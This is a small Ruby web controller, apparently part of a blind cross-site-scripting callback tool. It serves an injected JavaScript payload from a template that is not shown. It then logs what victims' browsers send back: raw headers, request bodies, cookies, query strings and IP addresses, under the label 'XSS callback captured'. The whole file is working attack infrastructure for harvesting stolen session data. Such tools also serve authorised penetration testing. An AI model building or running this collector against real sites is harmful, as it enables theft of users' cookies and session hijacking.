require_relative '../controller'

require 'json'

class CollectController < Controller
  def get
    @url = format '%s://%s:%d/collect',
      req.ssl? ? 'https' : 'http',
      req.host,
      req.port

    res.content_type = 'text/javascript'
    res.body = ERB.new(IO.read('app/views/collect.js.erb')).result(binding)
  end

  def post
    log = {
      raw: req.raw_header,
      body: req.body,
      cookies: req.cookies,
      query: req.query,
      request_line: req.request_line,
      ip_address: req.remote_ip,
    }

    logger.info('XSS callback captured') { log.to_json }
  end
end
